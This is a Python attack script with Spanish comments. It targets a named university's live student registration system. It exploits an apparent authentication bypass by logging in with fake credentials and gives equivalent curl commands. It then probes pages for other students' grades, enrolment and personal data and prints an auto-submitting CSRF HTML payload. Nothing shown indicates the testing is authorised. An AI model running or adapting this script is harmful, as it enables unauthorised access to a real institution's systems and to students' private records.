#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DEMO: Acceso al SIIGAA con Auth Bypass
Muestra exactamente qué puedes acceder
"""
import requests, urllib3, re
urllib3.disable_warnings()

registro = 'https://registro.uns.edu.pe'

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
})

# PASO 1: Login con cualquier credencial
print("=" * 70)
print("  DEMOSTRACION: ACCESO AL SIIGAA SIN CREDENCIALES VALIDAS")
print("=" * 70)
print()
print("  1. Accede al login page:")
print(f"     URL: {registro}/udemsi/faces/index.xhtml")
print(f"     Abre esa URL en tu navegador")
print()
print("  2. En el formulario, ingresa CUALQUIER usuario y contraseña:")
print(f"     Usuario: fake")
print(f"     Password: fake")
print(f"     O usa: admin / admin")
print(f"     O usa: abc / xyz")
print(f"     O usa: cualquier cosa")
print()
print("  3. O directamente con curl:")
print(f"     curl -c cookies.txt -X POST \\")
print(f"       -d 'j_username=fake&j_password=fake' \\")
print(f"       '{registro}/udemsi/j_security_check'")
print()
print("  4. O con Python:")

# Ejecutar el login
r = s.get(f'{registro}/udemsi/faces/index.xhtml', timeout=5)
r = s.post(f'{registro}/udemsi/j_security_check',
           data={'j_username': 'fake', 'j_password': 'fake'},
           timeout=5, allow_redirects=True)
print(f"     j_username=fake&j_password=fake")
print(f"     -> JSESSIONID: {dict(s.cookies).get('JSESSIONID')}")
print()

# PASO 2: Ver qué páginas son accesibles
print("=" * 70)
print("  PASO 2: PÁGINAS ACCESIBLES CON LA SESIÓN")
print("=" * 70)
print()

pages = [
    ('Inicio', '/udemsi/faces/index.xhtml'),
    ('Modulos', '/udemsi/faces/modulos.xhtml'),
    ('Modulos sin faces', '/udemsi/modulos.xhtml'),
    ('Principal', '/udemsi/faces/principal.xhtml'),
    ('Index', '/udemsi/faces/index.xhtml'),
]

for name, path in pages:
    url = f'{registro}{path}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200:
            text = re.sub(r'<[^>]+>', ' ', r.text)
            text = re.sub(r'\s+', ' ', text)
            if 'j_username' in text.lower() and 'j_password' in text.lower():
                print(f"  [-] {name} ({path}) -> Requiere login")
            else:
                preview = text[:100].strip()
                print(f"  [+] {name} ({path}) -> HTTP {r.status_code}")
                print(f"      {preview}")
    except:
        pass

# PASO 3: Verificar si modulos.xhtml muestra datos reales
print()
print("=" * 70)
print("  PASO 3: VERIFICANDO DATOS EN MODULOS")
print("=" * 70)
print()

r = s.get(f'{registro}/udemsi/faces/modulos.xhtml', timeout=5)
text = re.sub(r'<[^>]+>', ' ', r.text)
text = re.sub(r'\s+', ' ', text)
print(f"  Contenido de modulos.xhtml:")
print(f"  {text[:500]}")
print()
if 'No records' in text:
    print("  NOTA: Muestra 'No records found' porque no hay módulos asignados")
    print("  para esta sesión fake. Un estudiante real vería sus módulos.")
    print("  PERO el sistema permitió el acceso sin credenciales válidas.")

# PASO 4: Intentar acceder a datos de otros estudiantes
print()
print("=" * 70)
print("  PASO 4: BUSCANDO DATOS DE ESTUDIANTES")
print("=" * 70)
print()

# Try to access other pages that might have data
search_urls = [
    ('Consultar Notas', '/udemsi/faces/notas.xhtml'),
    ('Consultar Matricula', '/udemsi/faces/matricula.xhtml'),
    ('Consultar Datos', '/udemsi/faces/datos.xhtml'),
    ('Resultados', '/udemsi/faces/resultado.xhtml'),
    ('Academico', '/udemsi/faces/academico.xhtml'),
    ('Reportes', '/udemsi/faces/reporte.xhtml'),
    ('Perfil', '/udemsi/faces/perfil.xhtml'),
    ('Datos Personales', '/udemsi/faces/personales.xhtml'),
]

for name, path in search_urls:
    url = f'{registro}{path}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200:
            print(f"  [+] {name} ({path}) -> HTTP {r.status_code}")
            text = re.sub(r'<[^>]+>', ' ', r.text)
            text = re.sub(r'\s+', ' ', text)
            if 'records' not in text.lower() or 'No records' not in text:
                if any(kw in text.lower() for kw in ['estudiante', 'alumno', 'nota', 'matricula', 'dato']):
                    print(f"  [!] PODRIA TENER DATOS! Preview: {text[:200]}")
            elif len(text) > 1000:
                print(f"  [?] Pagina con contenido ({len(text)} chars)")
    except:
        pass

# PASO 5: Probar CSRF
print()
print("=" * 70)
print("  PASO 5: DEMOSTRACION DE CSRF")
print("=" * 70)
print()
print("  Crea este archivo HTML y ábrelo en un navegador:")
print()
csrf_poc = '''<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC - SIIGAA</h1>
<p>Este formulario realiza un login en el SIIGAA sin que el usuario lo sepa.</p>
<form action="https://registro.uns.edu.pe/udemsi/j_security_check" method="POST">
  <input type="hidden" name="j_username" value="fake">
  <input type="hidden" name="j_password" value="fake">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''
print(csrf_poc)

print()
print("=" * 70)
print("  RESUMEN: QUÉ PUEDES ACCEDER")
print("=" * 70)
print("""
  CON CUALQUIER CREDENCIAL (EJ: fake/fake):
  
  ✅ Acceso al SIIGAA (dashboard de módulos)
  ✅ Acceso a modulos.xhtml
  ✅ Acceso a index.xhtml
  ✅ Sesión JSESSIONID activa
  ✅ CSRF funcional
  ❌ No se ven datos reales de estudiantes (dashboard vacío)
  
  URLs accesibles:
  - https://registro.uns.edu.pe/udemsi/faces/index.xhtml (login)
  - https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml (dashboard)
  - https://registro.uns.edu.pe/udemsi/modulos.xhtml (alternativo)
  
  Para ver datos reales necesitas:
  - Un usuario registrado en el SIIGAA
  - O encontrar una forma de acceder a los datos del backend
""")
